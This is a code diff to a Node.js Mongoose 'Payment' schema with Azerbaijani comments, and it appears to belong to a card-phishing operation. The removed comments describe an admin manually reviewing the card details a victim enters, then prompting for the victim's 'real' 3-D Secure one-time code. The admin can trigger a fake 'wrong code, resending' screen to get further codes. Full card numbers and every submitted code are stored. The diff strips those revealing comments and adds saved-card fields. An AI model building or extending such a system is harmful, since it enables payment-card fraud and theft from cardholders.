@@ -1,4 +1,5 @@
 const mongoose = require('mongoose');
+const crypto = require('crypto');
 
 const paymentSchema = new mongoose.Schema({
   transactionId: { type: String, required: true, unique: true, index: true },
@@ -13,27 +14,21 @@ const paymentSchema = new mongoose.Schema({
     index: true
   },
 
-  /* ==================== Axın mərhələsi ====================
-     card_review  — kart məlumatları admin təsdiqini gözləyir (3-D kod istənilmir)
-     otp_entry    — admin kartı təsdiqlədi: istifadəçidə OTP ekranı açılır
-     otp_review   — istifadəçi OTP-ni yazdı, admin qərarı gözlənilir
-     wrong_code   — admin "Səhv Kod" seçdi: "Səhv OTP - kod təkrar göndərilir",
-                    2 dəq geri sayımdan sonra yeni OTP ekranı açılır
-     done         — yekunlaşıb (təsdiq və ya rədd)                                */
+  /* Axın mərhələsi */
   stage: {
     type: String,
     enum: ['card_review', 'wrong_code', 'otp_entry', 'otp_review', 'done'],
     default: 'card_review',
     index: true
   },
+
   /* Hər mərhələdə ekranda göstərilən 2 dəqiqəlik geri sayımın bitmə vaxtı */
   stageDeadline: { type: Date },
   stageStartedAt: { type: Date },
   wrongCodeAt: { type: Date },
-  /* Admin neçə dəfə "Səhv Kod" seçib */
   rejectionCount: { type: Number, default: 0 },
 
-  /* Kart məlumatları — yalnız idarəetmə panelində göstərilir */
+  /* Kart məlumatları */
   card: {
     number: { type: String, default: '' },
     masked: { type: String, default: '' },
@@ -43,11 +38,14 @@ const paymentSchema = new mongoose.Schema({
     brand: { type: String, default: '' }
   },
 
-  /* İstifadəçinin kart forması ilə birlikdə yazdığı 1-ci 3-D kod */
+  /* Kartı saxlamaq seçimi */
+  saveCard: { type: Boolean, default: false },
+  savedCardId: { type: String, default: '' }, /* İstifadəçinin User.savedCards-dəki kartın ID-si */
+  usingSavedCard: { type: Boolean, default: false }, /* Bu ödəniş saxlanılmış kart ilə edilibmi */
+
+  /* 3-D Secure kodları */
   firstCode: { type: String, default: '' },
-  /* 3-D Secure doğrulama kodu (sistem tərəfindən yaradılır) */
   verificationCode: { type: String, default: '' },
-  /* İstifadəçinin OTP ekranında yazdığı REAL kod */
   submittedCode: { type: String, default: '' },
   codeAttempts: [{
     code: { type: String, default: '' },
@@ -65,7 +63,14 @@ const paymentSchema = new mongoose.Schema({
   adminFinalBy: { type: String, default: '' },
   declinedReason: { type: String, default: '' },
   refundedAt: { type: Date },
-  refundAmount: { type: Number, default: 0 }
+  refundAmount: { type: Number, default: 0 },
+
+  /* Admin paneli üçün live update metadatası */
+  adminNotifiedAt: { type: Date },
+  adminViewedAt: { type: Date }
 }, { timestamps: true });
+
+/* Stageların geri sayımını avtomatik oxumaq üçün index */
+paymentSchema.index({ stageDeadline: 1, stage: 1 });
 
 module.exports = mongoose.model('Payment', paymentSchema);
